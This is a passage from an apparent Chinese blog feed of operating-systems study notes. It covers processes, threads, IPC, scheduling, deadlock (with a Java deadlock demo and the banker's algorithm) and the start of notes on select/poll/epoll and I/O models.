<p><strong>线程是调度的基本单位，而进程则是资源拥有的基本单位</strong>。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2"><strong>进程（Process）</strong> 是指计算机中正在运行的一个程序实例。进程是操作系统分配资源的基本单位，它拥有独立的内存空间和系统资源。每个进程都拥有自己的地址空间、堆、栈以及其他的系统资源。进程之间的通信需要通过进程间通信(IPC)的方式来进行。进程适合处理重量级的任务，但由于进程切换时需要保存和恢复大量的上下文信息，因此进程切换的开销相对较大。</li>
<li class="lvl-2"><strong>线程（Thread）</strong> 也被称为轻量级进程，更加轻量。多个线程可以在同一个进程中同时执行，并且共享进程的资源比如内存空间、文件句柄、网络连接等，共享进程的用户地址空间。线程是操作系统调度的基本单位，它是进程的一个执行单元。一个进程可以包含多个线程，这些线程<code>共享进程的地址空间和部分资源（如堆）</code>，但每个线程拥有自己独立的栈。线程之间的切换开销相对较小，因为它们共享进程的内存空间，不需要像进程那样在切换时保存和恢复大量的上下文信息。线程适合处理IO密集型任务，可以通过多线程并发执行来提高程序的执行效率。</li>
<li class="lvl-2">协程：协程是一种用户态的轻量级线程，它完全由程序控制，而不是由操作系统内核来调度。协程拥有自己的寄存器上下文和栈，但它们的栈是独立的，不与其他协程共享。协程之间的切换开销非常小，因为它们只涉及到少量的上下文切换。协程适合处理大量并发的、IO密集型的任务，可以通过协程的异步特性来提高程序的执行效率。</li>
</ul>
<p>优缺点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>进程切换开销大</p>
</li>
<li class="lvl-2">
<p>多个线程可以并发处理不同的任务，更有效地利用了多处理器和多核计算机。</p>
</li>
<li class="lvl-2">
<p>同一进程内的线程共享内存和文件，因此它们之间相互通信无须调用内核。</p>
</li>
</ul>
<h2 id="1-1-线程与进程的比较">1.1 线程与进程的比较</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>本质区别：进程是操作系统资源分配的基本单位，而线程是CPU任务调度和执行的基本单位</p>
</li>
<li class="lvl-2">
<p>在开销方面：每个进程都有独立的<mark>代码和数据空间</mark>（程序上下文），程序之间的切换会有较大的开销；线程可以看做轻量级的进程，同一类线程共享代码和数据空间，每个线程都有自己独立的运行<mark>栈和程序计数器（PC）、寄存器</mark>，线程之间切换的开销小</p>
</li>
<li class="lvl-2">
<p>稳定性方面：进程中某个线程如果崩溃了，可能会导致整个进程都崩溃。而进程中的子进程崩溃，并不会影响其他进程。</p>
</li>
<li class="lvl-2">
<p>内存分配方面：系统在运行的时候会为每个进程分配不同的内存空间；而对线程而言，除了CPU外，系统不会为线程分配内存（线程所使用的资源来自其所属进程的资源），线程组之间只能共享资源</p>
</li>
</ul>
<p>对于，线程相比进程能减少开销，体现在：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>线程的创建时间比进程快，因为进程在创建的过程中，还需要资源管理信息，比如内存管理信息、文件管理信息，而线程在创建的过程中，不会涉及这些资源管理信息，而是共享它们；</p>
</li>
<li class="lvl-2">
<p>线程的终止时间比进程快，因为线程释放的资源相比进程少很多；</p>
</li>
<li class="lvl-2">
<p>同一个进程内的线程切换比进程切换快，因为线程具有相同的地址空间（虚拟内存共享）</p>
</li>
<li class="lvl-2">
<p>由于同一进程的各线程间共享内存和文件资源，那么在线程之间数据传递的时候，就不需要经过内核了，这就使得线程之间的数据交互效率更高了；</p>
</li>
</ul>
<h1>2 进程</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>资源所有权</p>
</li>
<li class="lvl-2">
<p>可以被调度、执行</p>
</li>
</ul>
<h2 id="2-1-进程控制结构：-PCB（进程控制块）">2.1 进程控制结构： PCB（进程控制块）</h2>
<blockquote>
<p><strong>PCB（Process Control Block）</strong> 即进程控制块，是操作系统中用来管理和跟踪进程的数据结构，每个进程都对应着一个独立的 PCB。</p>
</blockquote>
<h2 id="2-2-进程状态">2.2 进程状态</h2>
<h3 id="2-2-1-五状态">2.2.1 五状态</h3>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409241546168.png" alt="image.png"></p>
<p>NULL -&gt; 创建状态：一个新进程被创建时的第一个状态；创建状态 -&gt; 就绪状态：当进程被创建完成并初始化后，一切就绪准备运行时，变为就绪状态，这个过程是很快的；就绪态 -&gt; 运行状态：处于就绪状态的进程被操作系统的进程调度器选中后，就分配给 CPU 正式运行该进程；运行状态 -&gt; 结束状态：当进程已经运行完成或出错时，会被操作系统作结束状态处理；运行状态 -&gt; 就绪状态：处于运行状态的进程在运行过程中，由于分配给它的运行时间片用完，操作系统会把该进程变为就绪态，接着从就绪态选中另外一个进程运行；运行状态 -&gt; 阻塞状态：当进程请求某个事件且必须等待时，例如请求 I/O 事件；阻塞状态 -&gt; 就绪状态：当进程要等待的事件完成时，它从阻塞状态变到就绪状态；</p>
<h3 id="2-2-2-七状态">2.2.2 七状态</h3>
<h2 id="2-3-进程间通信方式">2.3 进程间通信方式</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>管道/匿名管道(Pipes)：用于具有亲缘关系的父子进程间或者兄弟进程之间的通信。通信的数据是无格式的流并且大小受限，通信的方式是单向的</p>
</li>
<li class="lvl-2">
<p>有名管道(Named Pipes) : 匿名管道由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道。有名管道严格遵循先进先出(First In First Out) 。有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。</p>
</li>
<li class="lvl-2">
<p>消息队列(Message Queuing)：消息队列是消息的链表,具有特定的格式,存放在内存中并由消息队列标识符标识。管道和消息队列的通信数据都是先进先出的原则。与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。克服了管道通信的数据是无格式的字节流的问题。</p>
</li>
<li class="lvl-2">
<p><mark>共享内存</mark>(Shared memory)：使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。可以说这是最有用的进程间通信方式。可以解决消息队列通信中用户态与内核态之间数据拷贝过程带来的开销，它直接分配一个共享空间，每个进程都可以直接访问</p>
</li>
<li class="lvl-2">
<p>信号量(Semaphores)：保护共享资源，以确保任何时刻只能有一个进程访问共享资源</p>
</li>
<li class="lvl-2">
<p>信号(Signal)：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生；信号是异步通信机制，信号可以在应用进程和内核之间直接交互，内核也可以利用信号来通知用户空间的进程发生了哪些系统事件，信号事件的来源主要有硬件来源（如键盘 Cltr+C ）和软件来源（如 kill 命令）</p>
</li>
<li class="lvl-2">
<p>套接字(Sockets) : 此方法主要用于在客户端和服务器之间通过网络进行通信。套接字是支持 TCP/IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程<a href="https://www.jianshu.com/p/c1015f5ffa74">进程间通信IPC (InterProcess Communication) - 简书 (jianshu.com)</a><br>
每个进程的用户地址空间都是独立的，一般而言是不能互相访问的，但内核空间是每个进程都共享的，所以<em>进程之间要通信必须通过内核</em>。</p>
</li>
</ul>
<h3 id="2-3-1-管道">2.3.1 管道</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>匿名管道、命名管道</p>
</li>
<li class="lvl-2">
<p>单向管道、双向管道</p>
</li>
</ul>
<p><strong>管道，就是内核里面的一串缓存</strong>。从管道的一段写入的数据，实际上是缓存在内核中的，另一端读取，也就是从内核中读取这段数据。</p>
<p>管道的通信方式是效率低的，因此管道不适合进程间频繁地交换数据。写入管道的数据在被读取之前处于阻塞状态。</p>
<h3 id="2-3-2-消息队列">2.3.2 消息队列</h3>
<p><strong>消息队列是保存在内核中的消息链表</strong>，A 进程要给 B 进程发送消息，A 进程把数据放在对应的消息队列后就可以正常返回了，B 进程需要的时候再去读取数据就可以了。同理，B 进程要给 A 进程发送消息也是如此。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>消息队列不适合比较大数据的传输</strong></p>
</li>
<li class="lvl-2">
<p><strong>消息队列通信过程中，存在用户态与内核态之间的数据拷贝开销</strong>，因为进程写入数据到内核中的消息队列时，会发生从用户态拷贝数据到内核态的过程，同理另一进程读取内核中的消息数据时，会发生从内核态拷贝数据到用户态的过程。</p>
</li>
</ul>
<h3 id="2-3-3-共享内存">2.3.3 共享内存</h3>
<p>现代操作系统，对于内存管理，采用的是<em>虚拟内存技术</em>，也就是每个进程都有自己独立的虚拟内存空间，不同进程的虚拟内存映射到不同的物理内存中。所以，即使进程 A 和 进程 B 的虚拟地址是一样的，其实访问的是不同的物理内存地址。</p>
<p><strong>共享内存的机制，就是拿出一块虚拟地址空间来，映射到相同的物理内存中</strong>。这样这个进程写入的东西，另外一个进程马上就能看到了，都不需要拷贝来拷贝去，传来传去，大大提高了进程间通信的速度。不会发生用户态和内核态之间的消息拷贝过程。</p>
<h3 id="2-3-4-信号量">2.3.4 信号量</h3>
<p><strong>共享内存的机制，就是拿出一块虚拟地址空间来，映射到相同的物理内存中</strong>。这样这个进程写入的东西，另外一个进程马上就能看到了，都不需要拷贝来拷贝去，传来传去，大大提高了进程间通信的速度。</p>
<p><strong>信号量其实是一个整型的计数器，主要用于实现进程间的互斥与同步，而不是用于缓存进程间通信的数据</strong>。定义：semphore s</p>
<p>信号量s发送信号：semSignal(s)  V(s)</p>
<p>信号量s接收信号：semWait(s)    P(s)</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210724144342.PNG" alt="IMG_2757(20210724-143103)"></p>
<p>进程访问受信号量保护的共享数据：<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210724144348.PNG" alt="IMG_2757(20210724-143103)|400"></p>
<h3 id="2-3-5-信号">2.3.5 信号</h3>
<p>信号是<strong>异步通信机制</strong>，信号可以在应用进程和内核之间直接交互，内核也可以利用信号来通知用户空间的进程发生了哪些系统事件</p>
<p>信号事件的来源主要有硬件来源（如键盘 Cltr+C ）和软件来源（如 kill 命令）。</p>
<p>信号是进程间通信机制中<strong>唯一的异步通信机制</strong>，因为可以在任何时候发送信号给某一进程</p>
<h3 id="2-3-6-socket">2.3.6 socket</h3>
<p>前面提到的管道、消息队列、共享内存、信号量和信号都是在同一台主机上进行进程间通信，那要想<strong>跨网络与不同主机上的进程之间通信，就需要 Socket 通信了。</strong></p>
<p>实际上，Socket 通信不仅可以跨网络与不同主机的进程间通信，还可以在同主机上进程间通信。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405082053263.png" alt="image.png"></p>
<p><a href="https://xiaolincoding.com/os/4_process/process_commu.html#%E7%AE%A1%E9%81%93">5.2 进程间有哪些通信方式？ | 小林coding (xiaolincoding.com)</a></p>
<h2 id="2-4-进程上下文切换">2.4 进程上下文切换</h2>
<p>CPU上下文：CPU寄存器、程序计数器进程的上下文切换不仅包含了虚拟内存、栈、全局变量等用户空间的资源，还包括了内核堆栈、寄存器等内核空间的资源。</p>
<h2 id="2-5-僵尸进程、孤儿进程">2.5 僵尸进程、孤儿进程</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>僵尸进程</strong>：子进程已经终止，但是其父进程仍在运行，且父进程没有调用 wait()或 waitpid()等系统调用来获取子进程的状态信息，释放子进程占用的资源，导致子进程的 PCB 依然存在于系统中，但无法被进一步使用。这种情况下，子进程被称为“僵尸进程”。避免僵尸进程的产生，父进程需要及时调用 wait()或 waitpid()系统调用来回收子进程。</p>
</li>
<li class="lvl-2">
<p><strong>孤儿进程</strong>：一个进程的父进程已经终止或者不存在，但是该进程仍在运行。这种情况下，该进程就是孤儿进程。孤儿进程通常是由于父进程意外终止或未及时调用 wait()或 waitpid()等系统调用来回收子进程导致的。为了避免孤儿进程占用系统资源，操作系统会将孤儿进程的父进程设置为 init 进程（进程号为 1），由 init 进程来回收孤儿进程的资源。</p>
</li>
</ul>
<h1>3 线程</h1>
<p><strong>线程是进程当中的一条执行流程。</strong></p>
<p>同一个进程内多个线程之间可以共享代码段、数据段、打开的文件等资源，但每个线程各自都有一套独立的<strong>寄存器和栈</strong>，这样可以确保线程的控制流是相对独立的。</p>
<h2 id="3-1-线程间同步方式">3.1 线程间同步方式</h2>
<blockquote>
<p>线程同步是两个或多个共享关键资源的线程的并发执行。应该同步线程以避免关键的资源使用冲突。</p>
</blockquote>
<p><strong>互斥锁、读写锁、条件变量、自旋锁和信号量</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>互斥锁(Mutex)</strong>：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问。比如 Java 中的 <code>synchronized</code> 关键词和各种 <code>Lock</code> 都是这种机制。</p>
</li>
<li class="lvl-2">
<p>条件变量（Condition Variables）：条件变量(cond)是在多线程程序中用来实现&quot;等待–》唤醒&quot;逻辑常用的方法。条件变量利用线程间共享的全局变量进行同步的一种机制，主要包括两个动作：一个线程等待&quot;条件变量的条件成立&quot;而挂起；另一个线程使“条件成立”。为了防止竞争，条件变量的使用总是和一个互斥锁结合在一起。线程在改变条件状态前必须首先锁住互斥量，函数pthread_cond_wait把自己放到等待条件的线程列表上，然后对互斥锁解锁(这两个操作是原子操作)。在函数返回时，互斥量再次被锁住。</p>
</li>
<li class="lvl-2">
<p><strong>读写锁（Read-Write Lock）</strong>：允许多个线程同时读取共享资源，但只有一个线程可以对共享资源进行写操作。</p>
</li>
<li class="lvl-2">
<p><strong>信号量(Semaphore)</strong>：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量。</p>
</li>
<li class="lvl-2">
<p><strong>屏障（Barrier）</strong>：屏障是一种同步原语，用于等待多个线程到达某个点再一起继续执行。当一个线程到达屏障时，它会停止执行并等待其他线程到达屏障，直到所有线程都到达屏障后，它们才会一起继续执行。比如 Java 中的 <code>CyclicBarrier</code> 是这种机制。</p>
</li>
<li class="lvl-2">
<p><strong>事件(Event)</strong> :Wait/Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作。</p>
</li>
</ul>
<h2 id="3-2-线程分类">3.2 线程分类</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>用户线程（<em>User Thread</em>）</strong>：在用户空间实现的线程，不是由内核管理的线程，是由用户态的线程库来完成线程的管理；</p>
</li>
<li class="lvl-2">
<p><strong>内核线程（<em>Kernel Thread</em>）</strong>：在内核中实现的线程，是由内核管理的线程；</p>
</li>
<li class="lvl-2">
<p><strong>轻量级进程（<em>LightWeight Process</em>）</strong>：在内核中来支持用户线程；</p>
</li>
</ul>
<h1>4 进程调度</h1>
<h2 id="4-1-调度原则">4.1 调度原则</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>CPU 利用率</strong>：调度程序应确保 CPU 是始终匆忙的状态，这可提高 CPU 的利用率；</p>
</li>
<li class="lvl-2">
<p><strong>系统吞吐量</strong>：吞吐量表示的是单位时间内 CPU 完成进程的数量，长作业的进程会占用较长的 CPU 资源，因此会降低吞吐量，相反，短作业的进程会提升系统吞吐量；</p>
</li>
<li class="lvl-2">
<p><strong>周转时间</strong>：周转时间是进程运行+阻塞时间+等待时间的总和，一个进程的周转时间越小越好；（指一个进程从提交到完成之间的时间间隔）</p>
</li>
<li class="lvl-2">
<p><strong>等待时间</strong>：这个等待时间不是阻塞状态的时间，而是进程处于就绪队列的时间，等待的时间越长，用户越不满意；</p>
</li>
<li class="lvl-2">
<p><strong>响应时间</strong>：用户提交请求到系统第一次产生响应所花费的时间，在交互式系统中，响应时间是衡量调度算法好坏的主要标准。</p>
</li>
</ul>
<h2 id="4-2-调度算法">4.2 调度算法</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405082024222.png" alt="单处理器调度.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>先来先服务：非抢占式，不利于短作业</p>
</li>
<li class="lvl-2">
<p>时间片轮转RR调度算法：一种抢占式调度算法，分配给每个进程一个时间片，时间片结束之后调度下一个就绪的进程执行。</p>
</li>
<li class="lvl-2">
<p>最短进程优先</p>
</li>
<li class="lvl-2">
<p>高响应比优先：权衡短作业和长作业，等待时间长会获得高响应比</p>
</li>
<li class="lvl-2">
<p>最短剩余时间优先</p>
</li>
<li class="lvl-2">
<p>最高优先级调度算法</p>
</li>
<li class="lvl-2">
<p>多级反馈队列调度算法</p>
</li>
</ul>
<h1>5 并发性：互斥和同步</h1>
<h2 id="5-1-同步、互斥">5.1 同步、互斥</h2>
<table>
<thead>
<tr>
<th>并发</th>
<th>在一定时间内物理机器上有两个或两个以上的程序同处于开始运行但尚未结束的状态，并且次序不是事先确定的</th>
</tr>
</thead>
<tbody>
<tr>
<td>互斥</td>
<td>多个进程不能访问同一个资源（临界资源）</td>
</tr>
<tr>
<td>进程的同步</td>
<td>系统中多个进程相互合作，这些进程中发生的一些事件需要满足某种时序关系，从而共同完成一项任务</td>
</tr>
</tbody>
</table>
<h1>6 并发性：死锁和饥饿</h1>
<h2 id="6-1-死锁">6.1 死锁</h2>
<h3 id="6-1-1-产生死锁的四个必要条件">6.1.1 产生死锁的四个必要条件</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>互斥</strong>：资源必须处于非共享模式，即一次只有一个进程可以使用。如果另一进程申请该资源，那么必须等待直到该资源被释放为止。</p>
</li>
<li class="lvl-2">
<p><strong>占有并等待</strong>：一个进程至少应该占有一个资源，并等待另一资源，而该资源被其他进程所占有。</p>
</li>
<li class="lvl-2">
<p><strong>非抢占</strong>：资源不能被抢占。只能在持有资源的进程完成任务后，该资源才会被释放。</p>
</li>
<li class="lvl-2">
<p><strong>循环等待</strong>：有一组等待进程 <code>&#123;P0, P1,..., Pn&#125;</code>， <code>P0</code> 等待的资源被 <code>P1</code> 占有，<code>P1</code> 等待的资源被 <code>P2</code> 占有，……，<code>Pn-1</code> 等待的资源被 <code>Pn</code> 占有，<code>Pn</code> 等待的资源被 <code>P0</code> 占有。</p>
</li>
</ul>
<blockquote>
<p>必要条件：发生死锁，上述条件成立</p>
</blockquote>
<h3 id="6-1-2-模拟死锁">6.1.2 模拟死锁</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLock</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object a=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object b=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (a)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源a&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread()+<span class="string">&quot;请求资源b&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (b)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源b&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;线程1&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (b)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源b&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread()+<span class="string">&quot;请求资源a&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (a)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源a&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;线程2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="6-1-3-解决死锁的办法">6.1.3 解决死锁的办法</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>预防</strong> 是采用某种策略，<strong>限制并发进程对资源的请求</strong>，从而使得死锁的必要条件在系统执行的任何时间上都不满足。</p>
</li>
<li class="lvl-2">
<p><strong>避免</strong>则是系统在分配资源时，根据资源的使用情况<strong>提前做出预测</strong>，从而<strong>避免死锁的发生</strong></p>
</li>
<li class="lvl-2">
<p><strong>检测</strong>是指系统设有<strong>专门的机构</strong>，当死锁发生时，该机构能够检测死锁的发生，并精确地确定与死锁有关的进程和资源。</p>
</li>
<li class="lvl-2">
<p><strong>解除</strong> 是与检测相配套的一种措施，用于<strong>将进程从死锁状态下解脱出来</strong>。</p>
</li>
</ul>
<h4 id="死锁预防（prevention）">死锁预防（prevention）</h4>
<p>互斥：资源可以共享访问占有且等待：一次性请求所有资源循环等待：定义资源类型的线性顺序在层次分配策略下，所有的资源被分成了多个层次，一个进程得到某一次的一个资源后，它只能再申请较高一层的资源；当一个进程要释放某层的一个资源时，必须先释放所占用的较高层的资源不可剥夺：采用剥夺式算法</p>
<h4 id="死锁避免（avoidance）">死锁避免（avoidance）</h4>
<p>将系统的状态分为 <strong>安全状态</strong> 和 <strong>不安全状态</strong> ，每当在为申请者分配资源前先测试系统状态，若把系统资源分配给申请者会产生死锁，则拒绝分配，否则接受申请，并为它分配资源。</p>
<p>如果操作系统能够保证所有的进程在有限的时间内得到需要的全部资源，则称系统处于安全状态，否则说系统是不安全的。</p>
<p>银行家算法当一个进程申请使用资源的时候，<strong>银行家算法</strong> 通过先 <strong>试探</strong> 分配给该进程资源，然后通过 <strong>安全性算法</strong> 判断分配后系统是否处于安全状态，若不安全则试探分配作废，让该进程继续等待，若能够进入到安全的状态，则就 <strong>真的分配资源给该进程</strong>。</p>
<blockquote>
<p>[!note] 银行家算法</p>
</blockquote>
<p>分配给进程资源前，首先判断这个进程的安全性，也就是预执行，判断分配后是否产生死锁现象。如果系统当前资源能满足其执行，则尝试分配，如果不满足则让该进程等待。</p>
<p>系统给不同进程分配了不同资源，当前资源剩余量满足其中某个进程，调度进程执行，执行后释放分配的资源，找到一个调度顺序不发生死锁</p>
<h4 id="死锁检测（detection）">死锁检测（detection）</h4>
<p>这种方法对资源的分配不加以任何限制，也不采取死锁避免措施，但系统 <strong>定时地运行一个 “死锁检测”</strong> 的程序，判断系统内是否出现死锁，如果检测到系统发生了死锁，再采取措施去解除它。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统(5)：网络系统</title>
    <url>/2024/05/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(5)%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1>1 select/poll/epoll</h1>
<blockquote>
<p>select/poll/epoll 内核提供给用户态的多路复用系统调用，<strong>进程可以通过一个系统调用函数从内核中获取多个事件</strong>。</p>
</blockquote>
<h2 id="1-1-select">1.1 select</h2>
<p>select 实现多路复用的方式是，将已连接的 Socket 都放到一个<strong>文件描述符集合</strong>，然后调用 select 函数将文件描述符集合<strong>拷贝</strong>到内核里，让内核来检查是否有网络事件产生，检查的方式很粗暴，就是通过<strong>遍历</strong>文件描述符集合的方式，当检查到有事件产生后，将此 Socket 标记为可读或可写， 接着再把整个文件描述符集合<strong>拷贝</strong>回用户态里，然后用户态还需要再通过<strong>遍历</strong>的方法找到可读或可写的 Socket，然后再对其处理。</p>
<p>所以，对于 select 这种方式，需要进行 <strong>2 次「遍历」文件描述符集合</strong>，一次是在内核态里，一个次是在用户态里 ，而且还会发生 <strong>2 次「拷贝」文件描述符集合</strong>，先从用户空间传入内核空间，由内核修改后，再传出到用户空间中。</p>
<p>select 使用固定长度的 BitsMap，表示文件描述符集合，而且所支持的文件描述符的个数是有限制的，在 Linux 系统中，由内核中的 FD_SETSIZE 限制， 默认最大值为 <code>1024</code>，只能监听 0~1023 的文件描述符。</p>
<h2 id="1-2-poll">1.2 poll</h2>
<p>poll 不再用 BitsMap 来存储所关注的文件描述符，取而代之用动态数组，以链表形式来组织，突破了 select 的文件描述符个数限制，当然还会受到系统文件描述符限制。</p>
<p>但是 poll 和 select 并没有太大的本质区别，<strong>都是使用「线性结构」存储进程关注的 Socket 集合，因此都需要遍历文件描述符集合来找到可读或可写的 Socket，时间复杂度为 O(n)，而且也需要在用户态与内核态之间拷贝文件描述符集合</strong>，这种方式随着并发数上来，性能的损耗会呈指数级增长。</p>
<h2 id="1-3-epoll">1.3 epoll</h2>
<p>epoll 通过两个方面，很好解决了 select/poll 的问题。</p>
<p><em>第一点</em>，epoll 在内核里使用<strong>红黑树来跟踪进程所有待检测的文件描述字</strong>，把需要监控的 socket 通过 <code>epoll_ctl()</code> 函数加入内核中的红黑树里，红黑树是个高效的数据结构，增删改一般时间复杂度是 <code>O(logn)</code>。而 select/poll 内核里没有类似 epoll 红黑树这种保存所有待检测的 socket 的数据结构，所以 select/poll 每次操作时都传入整个 socket 集合给内核，而 epoll 因为在内核维护了红黑树，可以保存所有待检测的 socket ，所以只需要传入一个待检测的 socket，减少了内核和用户空间大量的数据拷贝和内存分配。</p>
<p><em>第二点</em>， epoll 使用<strong>事件驱动</strong>的机制，内核里<strong>维护了一个链表来记录就绪事件</strong>，当某个 socket 有事件发生时，通过<strong>回调函数</strong>内核会将其加入到这个就绪事件列表中，当用户调用 <code>epoll_wait()</code> 函数时，只会返回有事件发生的文件描述符的个数，不需要像 select/poll 那样轮询扫描整个 socket 集合，大大提高了检测的效率。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405091007632.png" alt="image.png"></p>
<h1>2 I/O模型</h1>
<p>socket在创建的时候默认是阻塞的。阻塞和非阻塞的概念能应用于所有文件描述符，而不仅仅是socket。我们称阻塞的文件描述符为阻塞IO，称非阻塞的文件描述符为非阻塞IO。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>针对阻塞I/O执行的系统调用可能因为无法立即完成而被操作系统挂起，直到等待的事件发生为止。可能被阻塞的系统调用包括accept、send、recv和connect。</p>
</li>
<li class="lvl-2">
<p>针对非阻塞IO执行的系统调用则总是立即返回，而不管事件是否已经发生。如果事件没有立即发生，这些系统调用就返回-1，和出错的情况一样。此时我们必须根据errno来区分这两种情况。对accept、sent和recv而言，事件未发生时erno通常被设置成EAGAIN（意为“再来一次”）或者EWOULDBLOCK（意为“期望阻塞”）；对connect而言，ermo则被设置成EINPROGRESS（意为“在处理中”）。</p>
</li>
</ul>
<blockquote>
<p>I/O复用(I/O multiplexing)：指的是通过一个支持同时感知多个描述符的函数系统调用，阻塞在这个系统调用上，等待某一个或者几个描述符准备就绪，就返回可读条件。I/O复用使得程序能同时监听多个文件描述符。<br>
I/O复用虽然能同时监听多个文件描述符，但它本身是<mark>阻塞</mark>的。</p>
</blockquote>
<h1>3 文件描述符就绪条件</h1>
<h2 id="3-1-可读">3.1 可读</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>socket内核接收缓存区中的字节数大于或等于其低水位标记SORCVLOWAT。此时我们可以无阻塞地读该socket，并且读操作返回的字节数大于0。</p>
</li>
<li class="lvl-2">
<p>socket通信的对方关闭连接。此时对该socket的读操作将返回0。</p>
</li>
<li class="lvl-2">
<p>监听socket上有新的连接请求。</p>
</li>
<li class="lvl-2">
<p>socket上有未处理的错误。此时我们可以使用getsockopt来读取和清除该错误。</p>
</li>
</ul>
<h2 id="3-2-可写">3.2 可写</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>socket内核发送缓存区中的可用字节数大于或等于其低水位标记SOSNDLOWAT。此时我们可以无阻塞地写该socket，并且写操作返回的字节数大于0。</p>
</li>
<li class="lvl-2">
<p>socket的写操作被关闭。对写操作被关闭的socket执行写操作将触发一个SIGPIPE信号。</p>
</li>
<li class="lvl-2">
<p>socket使用非阻塞connect连接成功或者失败（超时）之后。</p>
</li>
<li class="lvl-2">
<p>socket上有未处理的错误。此时我们可以使用getsockopt来读取和清除该错误</p>
</li>
</ul>
<h1>4 select</h1>
<blockquote>
<p>在一段指定时间内，监听用户感兴趣的文件描述符上的可读、可写和异常事件。</p>
</blockquote>
